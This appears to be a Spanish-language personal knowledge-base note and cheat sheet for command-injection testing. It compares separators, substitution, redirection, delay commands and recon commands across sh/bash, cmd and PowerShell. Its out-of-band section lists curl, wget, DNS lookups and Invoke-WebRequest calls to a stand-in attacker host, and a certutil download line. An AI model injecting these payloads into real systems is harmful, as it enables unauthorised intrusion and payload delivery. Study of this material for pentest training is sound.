---
tipo: meta
aliases:
  - Shells - matriz
  - Diferencias entre shells
tags:
  - meta/referencia
  - dominio/web
---

# Command injection shells - matriz de referencia

> [!info] Referencia pura, no un zettel
> Equivalente de [[Dialectos SQL - matriz de referencia]] para el eje **shell**. Qué cambia entre `sh`/`bash`, `cmd` y PowerShell. El criterio de canal vive en [[MOC - Command injection]].

## Separadores y sustitución

| Qué | `sh` / `bash` | `cmd` | PowerShell |
|---|---|---|---|
| Secuencial | `;` | `&` | `;` |
| Si el previo va bien | `&&` | `&&` | — |
| Si el previo falla | `\|\|` | `\|\|` | — |
| Pipe | `\|` | `\|` | `\|` |
| Segundo plano | `&` | `start` | `Start-Job` |
| Sustitución | `$(cmd)` o `` `cmd` `` | — | `$(cmd)` |
| Comentario | `#` | `rem` o `::` | `#` |
| Salto como separador | sí (`%0a`) | no | sí |
| Variable | `$VAR` | `%VAR%` | `$env:VAR` |

`cmd` no tiene sustitución de comandos en línea. Lo más parecido es `for /f`, que es incómodo y largo — en Windows conviene invocar PowerShell desde `cmd` si hace falta anidar.

PowerShell **no** tiene `&&` ni `||` antes de la versión 7. En hosts con Windows PowerShell 5.1, que sigue siendo lo habitual, hay que usar `;` o `if`.

## Identificar en qué shell se está

`echo $0`
`sh`/`bash`: devuelve el nombre del intérprete. En `cmd` imprime `$0` literal — que es en sí mismo la respuesta.

`echo %OS%`
`cmd`: devuelve `Windows_NT`. En Unix imprime `%OS%` literal.

`echo $PSVersionTable.PSVersion`
PowerShell. Distingue 5.1 de 7.x, que cambia qué operadores existen.

`uname -a`
`ver`
Uno de los dos responde. El que falle indica la familia por descarte.

## Redirección

| Qué | Unix | Windows |
|---|---|---|
| Salida a archivo | `> f` | `> f` |
| Añadir | `>> f` | `>> f` |
| Error a salida | `2>&1` | `2>&1` |
| Descartar | `> /dev/null` | `> nul` |
| Entrada desde archivo | `< f` | `< f` |

`2>&1` es lo primero que se prueba cuando un comando parece no ejecutarse: ver [[Command injection - canal directo]].

## Retardo — para el canal temporal

`sleep 5`
Unix. Universal.

`ping -c 5 127.0.0.1`
Unix sin `sleep`. Cinco paquetes, aproximadamente cinco segundos.

`ping -n 5 127.0.0.1`
Windows `cmd`. Ojo con la diferencia de flag: `-n` en Windows, `-c` en Unix. Confundirlas es la causa habitual de creer que no hay ejecución.

`timeout /t 5`
Windows. Falla si no hay entrada interactiva; `ping` es más confiable.

`Start-Sleep -s 5`
PowerShell.

## Primitivas de red — para el canal fuera de banda

`curl http://x.atacante.com`
`wget http://x.atacante.com`
Unix. Los más comunes; también los primeros que faltan en contenedores mínimos.

`nslookup x.atacante.com`
`dig x.atacante.com`
`host x.atacante.com`
Solo DNS, y por eso los que más sobreviven al filtrado de egress. `nslookup` existe en Windows y en casi todo Unix.

`ping -c 1 x.atacante.com`
Genera resolución DNS aunque ICMP esté bloqueado. La consulta sale antes que el paquete.

`Invoke-WebRequest http://x.atacante.com`
`iwr http://x.atacante.com`
PowerShell. En 5.1 la primera invocación es lenta por la inicialización del motor de Internet Explorer.

`certutil -urlcache -f http://x/a a`
Windows sin PowerShell. Binario firmado y presente por defecto.

## Lectura de archivos

| Qué | Unix | Windows |
|---|---|---|
| Ver archivo | `cat f` | `type f` |
| Listar | `ls -la` | `dir` |
| Buscar | `find / -name x` | `dir /s /b x` |
| Usuario actual | `id` / `whoami` | `whoami` |
| Variables | `env` | `set` |
| Red | `ip a` / `ss -tlnp` | `ipconfig /all` |

`whoami` existe en los tres y no necesita argumentos: es la prueba de ejecución más portable que hay.
